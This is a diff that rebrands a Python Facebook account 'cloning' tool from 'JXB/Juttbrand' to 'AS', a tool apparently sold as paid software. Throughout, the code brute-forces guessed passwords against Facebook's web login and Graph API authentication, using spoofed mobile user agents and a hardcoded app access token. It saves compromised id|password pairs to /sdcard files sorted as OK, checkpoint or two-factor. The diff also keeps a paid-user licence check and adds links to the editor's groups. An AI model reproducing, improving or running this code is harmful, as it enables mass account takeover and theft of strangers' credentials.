@@ -7,7 +7,7 @@ import platform,math,smtplib
 import platform
 import smtplib
 import math
-os.system('xdg-open https://facebook.com/groups/302474258349320/')
+os.system('xdg-open https://www.facebook.com/groups/227662170144640/?ref=share&mibextid=NSMWBT')
 import os,base64,zlib,pip,urllib
 
 print('\n\033[1;37m install modules...')
@@ -19,31 +19,31 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python JXB.py')
+        os.system('python AS.py')
 except:pass
 
-header_grup = {'user-agent':'Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]'}
-head = {'User Agent : Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]'}
-head = {"user-agent": "Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]"}
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]"}
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]"}
-api = {"user-agent": "Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]"}
-user_agent=['Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]']
-uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
-uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
-uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
-uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
-uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
-uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
-uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
-uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
-uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
-uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
-uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
-uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
-uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
-uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
-uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
+header_grup = {'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'}
+head = {'User Agent : "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'}
+head = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"}
+api = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"}
+user_agent= "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
+uas_bawaan = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
+uas_nokiac2 = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
+uas_nokiax20 = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
+uas_nokiax = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
+uas_samsungse = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
+uas_redmi9a = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
+uas_nokiaxl = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
+uas_chromelinux = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
+uas_j7prime = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
+uas_tes = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
+uas_random = random.choice(["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"])
+uas_nokiac3 = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
+uas_iphone = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
+uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
+uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"])
 ugen=[]
 for agent in range(10000):
         aa='Mozilla/5.0 (Linux; Android 6.0.1;'
@@ -109,26 +109,29 @@ device = {
         'fbca':fbca,
         'fbdm':fbdm}
 logo=("""\033[1;37m
-     888888 Y88b   d88P 888888b.   
-       "88b  Y88b d88P  888  "88b  
-        888   Y88o88P   888  .88P  
-        888    Y888P    8888888K.  
-        888    d888b    888  "Y88b 
-        888   d88888b   888    888 
-        88P  d88P Y88b  888   d88P 
-8b8     888 d88P   Y88b 8888888P"  
- 88b,88b88                                       
-----------------------------------------------
-\033[1;37m[-] AUTHOR    :\033[1;32m AWAIS TAHIR 
-\033[1;37m[-] GITHUB    :\033[1;32m JUTTBRAND
-\033[1;37m[-] VERSION   :\033[1;32m 2.4
+     
+ _______  _______ 
+(  ___  )(  ____ \
+| 
+| (___) || (_____ 
+|  ___  |(_____  )
+| (   ) |      ) |
+| )   ( |/\____) |
+|/     \|\_______)
+                  
+                               
+✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓
+\033[1;37m[-] EDITOR    :\033[1;32m Ataur Rahman 
+\033[1;37m[-] GITHUB    :\033[1;32m ATAURASRM
+\033[1;37m[-] EDITION   :\033[1;32m 0.01
 \033[1;37m[-] STATUS    :\033[1;32m PREMIUM
---------------------------------------------
-[-] JUTTBRAND PAID TOOL V2.4
-[-] Update every 2 days
-\033[1;32m----------------------------------------------""")
+✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓
+THIS TOOLS IS PAID V0.01
+Update Daily 2 Times
+(10:00-11:00am and 10:30-11:30pm) BD Time
+\033[1;32m✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓""")
 def linex():
-        print('\033[1;37m----------------------------------------------')
+        print('\033[1;37m✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓')
 def clear():
         os.system('clear')
         print(logo)
@@ -174,7 +177,7 @@ def login():
 
 def menu():
     import platform
-    myid = platform.platform()[::-1].upper().replace('-','').replace('.','').replace('UNIL','JXB')
+    myid = platform.platform()[::-1].upper().replace('-','').replace('.','').replace('UNIL','AS')
     os.system(" clear ")
     with urlopen("https://awaistahir07.blogspot.com/2022/06/approv-system.html") as response:
         body = response.read()
@@ -185,7 +188,7 @@ def menu():
         print("You are not paid user ")
         sys.exit()
 def za():
-    myid = platform.platform()[::-1].upper().replace('-','').replace('.','').replace('UNIL','JXB')
+    myid = platform.platform()[::-1].upper().replace('-','').replace('.','').replace('UNIL','AS')
     os.system(" clear ")
     with urlopen("https://awaistahir07.blogspot.com/2022/12/approvltxt2.html") as response:
         body = response.read()
@@ -198,7 +201,7 @@ def za():
         input(" press enter to send key")
         linex();print(" You are not paid user ");linex()
         os.system("xdg-open https://wa.me/+923431044275");time.sleep(5);menu()
-        print(" run again python JXB.py")
+        print(" run again python AS.py")
 "za()"
 
 def public():
@@ -237,7 +240,7 @@ def public():
         linex()
         print(' Try method 2 & 3 for best results  ')
         linex()
-        print(' [1] Method 1 (for new ids) \n [2] Method 2 (for mix ids)\n [3] Method 3 (for mic ids)')
+        print(' [1] Method 1 (for new ids) \n [2] Method 2 (for mix ids)\n [3] Method 3 (for mix ids)')
         linex()
         mthd = input(' Choose method: ')
         linex()
@@ -296,7 +299,7 @@ def public():
                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python JXB.py')
+                os.system('python AS.py')
         except requests.exceptions.ConnectionError:
                 exit(f' No internet connection')
         except (KeyError,IOError):
@@ -314,7 +317,7 @@ def menu():
                 clear()
                 if 1==1:
                         clear()
-                        print(' [1] File cloning\n [2] Create file\n [3] Public cloning\n [4] Random cloning\n [5] gmail cloning\n [6] WhatsApp Group join\n [7] Send feedback\n [8] How To Use Juttbrand tool\n [0] Exit prograam')
+                        print(' [1] File cloning\n [2] Create file\n [3] Public cloning\n [4] Random cloning\n [5] gmail cloning\n [6] WhatsApp Group join\n [7] Send feedback\n [8] How To Use AS tool\n [0] Exit prograam')
                         linex()
                         xd=input(' Choose an option: ')
                         if xd in ['1','01']:
@@ -403,7 +406,7 @@ def menu():
                                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                                 linex()
                                 input(' Press enter to back ')
-                                os.system('python JXB.py')
+                                os.system('python AS.py')
                         elif xd in ['2','02']:
                                 import dump
                                 dump.Main()
@@ -431,7 +434,7 @@ def menu():
                                 wx=('G2UfzG9uqDgFVVVHXUYUln')
                                 os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
                         elif xd in ['7','07']:
-                                os.system('xdg-open wa.me/+923231243823');menu()
+                                os.system('xdg-open https://chat.whatsapp.com/L0gCOPlIcDa5wjOdKv6eQo');menu()
                         elif xd in ['8','08']:
                                 os.system('xdg-open https://youtu.be/fAaPOdmpRoI');menu()
                         elif xd in ['0','00']:
@@ -439,7 +442,7 @@ def menu():
                         else:
                                 exit(' Option not found in menu...')
                 else:
-                        print(' Run :  python JXB.py')
+                        print(' Run :  python AS.py')
 
 
                         linex()
@@ -478,7 +481,7 @@ def pak():
                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python JXB.py')
+                os.system('python AS.py')
 def bd():
                 user=[]
                 clear()
@@ -508,7 +511,7 @@ def bd():
                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python JXB.py')
+                os.system('python AS.py')
 def indo():
 
                 user=[]
@@ -544,7 +547,7 @@ def indo():
                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python JXB.py')
+                os.system('python AS.py')
               
 def gmail():
                 os.system('rm -rf .re.txt')
@@ -600,10 +603,10 @@ def gmail():
                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python JXB.py')
+                os.system('python AS.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [Juttbrand] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [AS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -622,14 +625,14 @@ def ffb(ids,names,passlist):
                         complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         Aking=session.cookies.get_dict().keys()
                         if "c_user" in Aking:
-                                print('\r\r\033[1;32m [JXB-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/JXB-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print('\r\r\033[1;32m [AS-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/AS/AS-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Aking:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[38;5;208m [JXB-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/JXB-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;208m [AS_CP ID] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/AS FILE/AS_CP ID.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -642,7 +645,7 @@ def ffb(ids,names,passlist):
 def api(ids,names,passlist):
         try:
                 global oks,loop,sim_id,device
-                sys.stdout.write('\r\r\033[1;37m [Juttbrand] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [AS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 
                 fn = names.split(' ')[0]
 
@@ -726,23 +729,23 @@ def api(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [JXB-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/JXB-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [AS-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/AS/AS-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[JXB-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[AS-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [JXB-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/JXB-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [AS_CP ID] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/AS FILE/AS_CP ID.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/JXB-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/AS FILE/AS_CP ID.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -753,7 +756,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
         try:
                 global oks,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [Juttbrand] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [AS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -836,23 +839,23 @@ def api1(ids,names,passlist):
                         po = requests.post(url,data=data,headers=headers).json()
                         
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [JXB-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/JXB-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [AS-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/AS/AS-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[JXB-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[AS-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [JXB-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/JXB-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [AS_CP ID] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/AS FILE/AS_CP ID.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/JXB-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/AS FILE/AS_CP ID.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -863,7 +866,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [Juttbrand] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [AS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -945,8 +948,8 @@ def rndm(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [JXB-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/JXB-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [AS-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/AS/AS-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -956,8 +959,8 @@ def rndm(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;208m [JXB-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/JXB-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;208m [AS_CP ID] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/AS FILE/AS_CP ID.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
